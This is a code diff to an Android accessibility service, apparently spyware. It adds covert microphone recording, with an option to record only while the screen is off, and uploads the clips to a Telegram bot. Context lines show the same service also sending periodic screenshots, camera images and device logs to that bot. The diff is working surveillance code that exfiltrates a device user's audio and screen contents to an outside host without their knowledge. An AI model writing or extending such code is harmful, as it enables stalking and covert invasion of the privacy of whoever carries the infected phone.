@@ -99,6 +99,16 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
     }
 
+    // Audio settings
+    private var sendAudio: Boolean = false
+    private var audioDuration: Long = 60000L
+    private var audioScreenOff: Boolean = false
+    
+    private var audioJob: Job? = null
+    private var mediaRecorder: android.media.MediaRecorder? = null
+
+    // ...
+
     private fun loadCredentials() {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         botToken = pref.getString("token", "") ?: ""
@@ -106,7 +116,12 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         sendCamera = pref.getBoolean("sendCamera", false)
         val sec = pref.getLong("screenshotInterval", 10L) 
         screenshotInterval = sec * 1000L
-        if (screenshotInterval < 5000L) screenshotInterval = 5000L // Minimum 5s enforcement
+        if (screenshotInterval < 5000L) screenshotInterval = 5000L 
+        
+        sendAudio = pref.getBoolean("sendAudio", false)
+        audioDuration = pref.getLong("audioDuration", 60L) * 1000L
+        if (audioDuration < 5000L) audioDuration = 5000L
+        audioScreenOff = pref.getBoolean("audioScreenOff", false)
     }
 
     private var lastLogSendTime = System.currentTimeMillis()
@@ -119,10 +134,10 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                 loadCredentials()
                 
                 if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
-                    captureAndSend()
-                    if (sendCamera) {
-                        captureCameraAndSend()
-                    }
+                    captureAndSend() // Screenshots still managed here (Accessibility dependent)
+                    
+                    // Camera moved to MonitorService
+                    // if (sendCamera) captureCameraAndSend()
                     
                     // Check logs periodicity (every 1 hour)
                     if (System.currentTimeMillis() - lastLogSendTime > 1 * 60 * 60 * 1000) {
@@ -131,6 +146,93 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                 }
                 delay(screenshotInterval) 
             }
+        }
+        // Audio Loop moved to MonitorService
+        // startAudioLoop()
+    }
+    
+    private fun startAudioLoop() {
+        audioJob?.cancel()
+        audioJob = CoroutineScope(Dispatchers.IO).launch {
+            while (isActive) {
+                if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
+                    val shouldRecord = if (audioScreenOff) !isScreenOn() else true
+                    
+                    if (shouldRecord) {
+                        recordAndSendAudio()
+                    } else {
+                        // If waiting for screen off, check every 5 seconds
+                        delay(5000)
+                    }
+                } else {
+                    delay(5000)
+                }
+            }
+        }
+    }
+    
+    private fun isScreenOn(): Boolean {
+        val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+        return powerManager.isInteractive
+    }
+    
+    private suspend fun recordAndSendAudio() {
+        val audioFile = java.io.File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
+        
+        try {
+            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                android.media.MediaRecorder(this)
+            } else {
+                android.media.MediaRecorder()
+            }
+            
+            mediaRecorder?.apply {
+                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                setOutputFile(audioFile.absolutePath)
+                prepare()
+                start()
+            }
+            
+            // Record for duration
+            delay(audioDuration)
+            
+            try {
+                mediaRecorder?.stop()
+            } catch(e: RuntimeException) {
+                // Fails if recording is too short (shorter than ~1s)
+            }
+            mediaRecorder?.release()
+            mediaRecorder = null
+            
+            // Send
+            if (audioFile.exists() && audioFile.length() > 0) {
+                sendTelegramAudio(botToken, targetChatId, audioFile)
+                audioFile.delete()
+            }
+            
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Audio record failed", e)
+            mediaRecorder?.release()
+            mediaRecorder = null
+            delay(5000) // Backoff
+        }
+    }
+    
+    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File) {
+        val url = "https://api.telegram.org/bot$token/sendAudio"
+        try {
+             val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("audio", file.name,
+                    file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
+                .build()
+            val request = Request.Builder().url(url).post(requestBody).build()
+            client.newCall(request).execute().use { }
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Failed to send audio", e)
         }
     }
     
@@ -394,10 +496,16 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     override fun onInterrupt() {
         Log.w("TelegramService", "Service Interrupted")
         job?.cancel()
+        audioJob?.cancel()
+        mediaRecorder?.release()
+        mediaRecorder = null
     }
     
     override fun onUnbind(intent: Intent?): Boolean {
         job?.cancel()
+        audioJob?.cancel()
+        mediaRecorder?.release()
+        mediaRecorder = null
         try {
             unregisterReceiver(forceSendReceiver)
         } catch (e: Exception) {
